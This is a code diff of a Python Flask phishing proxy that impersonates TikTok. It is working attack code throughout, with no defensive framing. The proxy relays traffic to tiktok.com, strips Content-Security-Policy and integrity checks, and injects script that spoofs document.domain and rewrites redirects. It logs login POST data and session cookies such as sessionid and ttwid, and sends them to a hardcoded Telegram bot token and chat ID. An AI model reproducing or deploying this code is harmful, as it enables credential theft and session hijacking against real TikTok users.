@@ -8,102 +8,97 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 a = Flask(__name__)
 a.wsgi_app = ProxyFix(a.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 
-
 T = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"
 C = "1367401179"
 
-class EvilProxy:
+class EvilHarvester:
     def __init__(self):
         self.target = "www.tiktok.com"
-       
-        self.domains = ["www.tiktok.com", "tiktok.com", "m.tiktok.com", "v16m.tiktokcdn.com"]
+        self.ess = ['sessionid', 'sid_tt', 'uid_tt', 'ttwid', 'msToken', 'odin_tt']
 
-    def notify(self, m):
+    def n(self, m):
         try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"})
         except: pass
 
-    def bypass_filters(self, content, host):
-      
-        for d in self.domains:
-            content = content.replace(f"https://{d}", f"https://{host}")
-            content = content.replace(f"//{d}", f"//{host}")
+    def r(self, t, h):
+        t = t.replace(f'https://{self.target}', f'https://{h}')
+        t = t.replace('www.tiktok.com', h)
+        t = t.replace('Content-Security-Policy', 'X-Proxy-CSP')
+        t = re.sub(r'integrity="[^"]+"', '', t)
         
-        
-        content = content.replace('Content-Security-Policy', 'X-Proxy-CSP')
-        content = re.sub(r'integrity="[^"]+"', '', content)
-        
-        
-        if '<head>' in content:
-            script = f"""
-            <script>
-                window.addEventListener('load', function() {{
-                    // م
-                    Object.defineProperty(document, 'domain', {{get: function() {{return '{self.target}';}}}});
-                }});
-            </script>
-            """
-            content = content.replace('<head>', f'<head>{script}')
-        return content
+        i = f"""
+        <script>
+            (function() {{
+                const op = window.location.replace;
+                window.location.replace = function(u) {{
+                    if(u.includes('tiktok.com')) u = u.replace('www.tiktok.com', '{h}');
+                    window.location.href = u;
+                }};
+                Object.defineProperty(document, 'domain', {{get: function() {{return '{self.target}';}}}});
+            }})();
+        </script>
+        """
+        return t.replace('<head>', f'<head>{i}')
 
-proxy = EvilProxy()
+e = EvilHarvester()
 
-@a.route('/', defaults={'path': ''})
-@a.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
-def handle_request(path):
-    host = request.headers.get('Host')
-    url = urljoin(f"https://{proxy.target}", path)
+@a.route('/')
+def home():
+    return redirect('/login')
+
+@a.route('/<path:p>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
+def p(p):
+    h = request.headers.get('Host')
+    u = urljoin(f"https://{e.target}", p)
     if request.query_string:
-        url += '?' + request.query_string.decode()
+        u += '?' + request.query_string.decode()
 
-    
-    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding', 'content-length']}
-    headers['Host'] = proxy.target
-    headers['Referer'] = f"https://{proxy.target}/"
+    H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
+    H['Host'] = e.target
 
-    
     if request.method == 'POST':
-        payload = request.get_data(as_text=True)
-        if any(key in payload.lower() for key in ['pass', 'user', 'login', 'email']):
-            proxy.notify(f"🎯 <b>Captured Credentials:</b>\n<code>{payload[:1500]}</code>")
+        d = request.get_data(as_text=True)
+        if any(k in d.lower() for k in ['pass', 'user', 'login', 'email']):
+            e.n(f"🎯 <b>Data:</b>\n<code>{d[:1000]}</code>")
 
     try:
-        
-        response = requests.request(
+        r = requests.request(
             method=request.method,
-            url=url,
-            headers=headers,
+            url=u,
+            headers=H,
             cookies=request.cookies,
             data=request.get_data(),
             allow_redirects=False,
             verify=False
         )
 
-        content = response.content
-        if 'text/html' in response.headers.get('Content-Type', ''):
-            content = proxy.bypass_filters(content.decode('utf-8', errors='ignore'), host).encode()
+        ck = r.cookies.get_dict()
+        if 'sessionid' in ck:
+            s = "; ".join([f"{k}={v}" for k, v in ck.items() if k in e.ess])
+            e.n(f"🔥 <b>SESSION:</b>\n<code>{s}</code>")
 
-        res = make_response(content)
-        res.status_code = response.status_code
+        b = r.content
+        if 'text/html' in r.headers.get('Content-Type', ''):
+            b = e.r(b.decode('utf-8', errors='ignore'), h).encode()
 
-        
-        for k, v in response.cookies.items():
-            
+        res = make_response(b)
+        res.status_code = r.status_code
+
+        for k, v in r.headers.items():
+            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'set-cookie']:
+                res.headers[k] = v
+
+        for k, v in r.cookies.items():
             res.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=None)
 
-        
-        if 'sessionid' in response.cookies:
-            full_session = "; ".join([f"{k}={v}" for k, v in response.cookies.items()])
-            proxy.notify(f"🔥 <b>GOLDEN SESSION CAPTURED!</b>\n<code>{full_session}</code>")
-
-        
-        if response.status_code in [301, 302, 303]:
-            loc = response.headers.get('Location', '').replace(proxy.target, host)
-            res.headers['Location'] = loc
+        if r.status_code in [301, 302, 303, 307, 308]:
+            l = r.headers.get('Location', '').replace(e.target, h)
+            res.headers['Location'] = l
 
         return res
 
-    except Exception as e:
-        return f"Proxy Error: {str(e)}", 500
+    except Exception as err:
+        return str(err), 500
 
 if __name__ == '__main__':
     a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
